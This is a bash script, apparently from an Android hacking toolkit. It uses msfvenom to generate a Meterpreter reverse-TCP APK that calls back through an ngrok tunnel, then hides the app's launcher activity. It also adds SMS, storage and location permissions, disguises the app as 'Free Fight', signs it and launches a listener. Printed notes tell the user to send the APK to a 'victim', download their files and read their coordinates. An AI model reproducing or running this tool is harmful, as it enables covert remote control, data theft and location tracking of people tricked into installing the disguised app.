red='\e[1;31m'
yellow='\e[1;33m'
white='\e[1;37m'
Escape="\033";
RedF="${Escape}[31m";
green='\e[0;32m'
# cleaning previous apk
#if [( $(ls | grep -w *".apk"))== *".apk"]
#then
rm $(ls | grep -w *".apk");
gnome-terminal -e "bash -c \" ./ngcheck.sh; exec bash\""
echo "--------------------------------------------------------------------------------------"
echo " "
echo " --------------------------ngrok public tunnel opend----------------------------------"
echo " "

echo " Copy the Public host & port Number from ngrok terminal (Forwarding  tcp://(this lhost)--> 0.tcp.ngrok.io:55555 <--(this loprt))" 
echo " "
echo -e $red "Note: Don't close the ngrok terminal"
echo -e $white " "
read -p "Enter the lhost                :" lhost
echo " "
read -p "Enter the lport                :" lport
echo " "
read -p "Enter the name of apk you need :" ap
echo " "
echo "--------------------------------------------------------------------------------------"
echo " "
echo " ------------------------Payload Generating section-----------------------------------"
echo " "
i=1
b=2
for i in {1..50}; do 
val=`expr $i % $b`

if [ $val == 0 ]
then
 ip='-'
 str1="$str1$ip"
printf '\r Generating apk  - %s> ' $str1; sleep 0.1; 
else
  ip='-'
  str1="$str1$ip"
 printf '\r Generating apk  -  -%s' $str1; sleep 0.1;
 fi
  done
  s=$(whoami)
echo " "

msfvenom --arch dalvik --platform android --payload android/meterpreter/reverse_tcp lhost=$lhost lport=$lport /home/$s/Desktop>$ap.apk
#----------------------------------------------------------------------------------------
echo " "
echo " Payload generated................."
echo " "
sleep 0.5
echo " Decompiling apk.................. "
echo " "
apktool d $ap.apk
echo " "
echo " Creating app icon................."
echo " "
sleep 0.5
cp -r drawable /home/$s/Desktop/andro_hack/$ap/res/
echo " "
echo " Copying app icon-drawable to main. "
echo " "
cd $ap
sed -i '29d' AndroidManifest.xml
sleep 0.5
echo " Editing AndroidManifest activity... "
echo " "
sed -i '28a<activity android:icon="@drawable/icon" android:label="@string/app_name" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">' AndroidManifest.xml
sleep 0.5
sed -i '26a<uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>' AndroidManifest.xml
sed -i '26a<uses-permission android:name="android.permission.WRITE_SMS"/>' AndroidManifest.xml 
sed -i '26a<uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>' AndroidManifest.xml
sed -i '26a<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>' AndroidManifest.xml
sed -i '26a<uses-permission android:name="android.permission.GET_TASKS"/>' AndroidManifest.xml
sed -i '26a<uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>' AndroidManifest.xml   
sed -i '26a<uses-permission android:name="android.permission.BLUETOOTH"/>' AndroidManifest.xml   
sed -i '26a<uses-permission android:name="android.permission.LOCATION_HARDWARE"/>' AndroidManifest.xml
sed -i '26a<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION"/>' AndroidManifest.xml
sleep 0.5
cd res
cd values
sed -i '3d' strings.xml
sed -i '2a<string name="app_name">Free Fight</string>' strings.xml
cd --
cd /home/$s/Desktop/andro_hack/
sleep 0.5
echo " "
echo " App icon created................... "
echo " "
sleep 0.5 
echo " Compiling the $ap.apk file........."
apktool b $ap
sleep 0.5
echo " "
echo " Removing existing apk file....... "
rm $ap.apk
sleep 0.5
cd $ap/dist/
sleep 0.5
cp -r $ap.apk /home/$s/Desktop/andro_hack/
sleep 0.5
echo " "
echo " Copying $ap.apk to main file.... "
echo " "
cd --
cd /home/$s/Desktop/andro_hack/
rm -r $ap
echo " Removing the Decompiled $ap folder"
echo " "
echo " Your application successfully created "
echo " "
sleep 0.5
echo " Your $ap.apk needed signing for (fake) verification"
echo " "
echo " -----------------------------APK signing section-------------------------------------"
echo " "
echo -e $yellow " Asking for App information just fill randomly and remember the password :${red} android"
echo " "
echo -e $white "-------------------------------------------------------------------------------------- "
echo " "
echo " Creating Keystore................."
echo " "
sleep 0.5
echo " "
echo " Executing the Keystore............ "
echo " "
sleep 0.5
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
echo " "
echo " Successfully created keystore....."
echo " "
echo "------------------------------------------------------------------------------------------- "
echo " "
echo " Signing Your application.........."
echo " "
sleep 0.5
echo " Signing  the apk using jarsigner.."
echo " "
jarsigner -keystore key.jks  -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $ap.apk my-alias
echo " "
echo " Successfully signed the apk ....."
echo " "
echo " Zipaligning the apk..............."
echo " "
sleep 0.5
zipalign -v 4 $ap.apk new_$ap.apk
mv new_$ap.apk $ap.apk
echo "------------------------------------------------------------------------------------------- "
echo " "
echo " Opening file system..............."
echo " "
sleep 0.5
echo " Send the apk to victim ..........(Note : after installing the apk name will changed to Free Fight.)"
sleep 0.5
rm key.jks
xdg-open /home/$s/Desktop/andro_hack
sleep 0.5
i=1
while [ $i == 1 ]
do
echo " "
read -p " Are you sent the apk [y/n]             : " pass
 case "$pass" in
  "y")echo " "
read -p " Do you want to open exploit now! [y/n]  : " pas
      case "$pas" in
      "y")echo " "
echo " "
echo "------------------------------ Exploit- Listener --------------------------------- "
echo " "
sleep 0.5
echo " Starting Apache2 service............. "
sleep 0.5
sudo service apache2 start
echo " "
sleep 0.5
echo " Starting Postgresql service.......... "
echo " "
sudo service postgresql start
echo " "
sleep 0.5
echo " Opening Msfconsole exploit........... "
echo " "
sleep 0.5
echo "--------------------------------MSFCONSOLE--------------------------------------- "
echo " "             
          break
       ;;
       "n") echo " "
  echo " Waiting for your confirmation......."
       echo " "
       sleep 0.5
  echo " Send the apk  to victm.............."
  sleep 0.8
       ;;
       esac
       ;;
   "n")echo " "
  echo " Waiting for your confirmation........"
   echo " "
   sleep 0.5
  echo " Send the apk  to victm................"
  echo " "
  sleep 0.8
   ;;
 esac
done
#-------------------------------------------------------------------------------------------
#function listeners 
echo " Note:-"
echo " . This will automatically collect all details of victim such as process,files,app list,etc."
echo " . If you need victim files use the command- download 'path to file' "
echo " . copy the longitude and lattitude from lister terminal and paste in location finder terminal"
echo " "
sleep 1
gnome-terminal -e "bash -c \" ./location.sh; exec bash\""
msfconsole -x -f -r ./payload1.sh



